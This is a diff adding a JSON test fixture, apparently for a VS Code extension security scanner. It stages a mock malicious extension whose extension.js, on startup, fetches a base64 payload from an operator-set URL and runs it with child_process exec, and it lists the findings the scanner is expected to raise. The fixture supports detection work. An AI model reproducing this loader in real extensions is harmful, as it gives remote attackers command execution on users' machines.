@@ -1,0 +1,42 @@
+{
+  "id": "vscode-startup-remote-command-loader",
+  "title": "VSIX startup activation fetches and executes a remote command",
+  "category": "vscode-extension",
+  "intent": "Models malicious VS Code extensions that activate on startup, read an undeclared operator-controlled configuration key, fetch an encoded payload, and execute it with child_process.",
+  "extensionId": "example.remote-text-fetcher",
+  "version": "1.0.0",
+  "sha256": "abababababababababababababababababababababababababababababababab",
+  "stagedFiles": [
+    {
+      "path": "extension/package.json",
+      "size": 383,
+      "sha256": "00",
+      "flags": [],
+      "textSample": "{\n  \"name\": \"remote-text-fetcher\",\n  \"publisher\": \"example\",\n  \"version\": \"1.0.0\",\n  \"engines\": { \"vscode\": \"^1.80.0\" },\n  \"main\": \"./out/extension\",\n  \"activationEvents\": [\"onStartupFinished\"],\n  \"contributes\": {\n    \"configuration\": {\n      \"properties\": {\n        \"remoteTextFetcher.url\": { \"type\": \"string\" }\n      }\n    }\n  }\n}\n"
+    },
+    {
+      "path": "extension/out/extension.js",
+      "size": 349,
+      "sha256": "00",
+      "flags": [],
+      "textSample": "const vscode = require('vscode');\nconst https = require('https');\nconst { exec } = require('child_process');\nfunction activate() {\n  const url = vscode.workspace.getConfiguration('agentService').get('url');\n  https.get(url, res => res.on('data', chunk => {\n    const cmd = Buffer.from(String(chunk), 'base64').toString('utf8');\n    exec(cmd);\n  }));\n}\n"
+    }
+  ],
+  "expectedRisk": "critical",
+  "expectedFindings": [
+    { "ruleId": "code.process-execution", "severity": "high", "file": "out/extension.js" },
+    { "ruleId": "code.network-access", "severity": "high", "file": "out/extension.js" },
+    { "ruleId": "code.dynamic-evaluation", "severity": "high", "file": "out/extension.js" },
+    { "ruleId": "vscode.broad-activation", "severity": "high", "file": "package.json" },
+    {
+      "ruleId": "vscode.startup-remote-command",
+      "severity": "critical",
+      "file": "out/extension.js"
+    },
+    {
+      "ruleId": "vscode.undeclared-configuration-read",
+      "severity": "high",
+      "file": "out/extension.js"
+    }
+  ]
+}
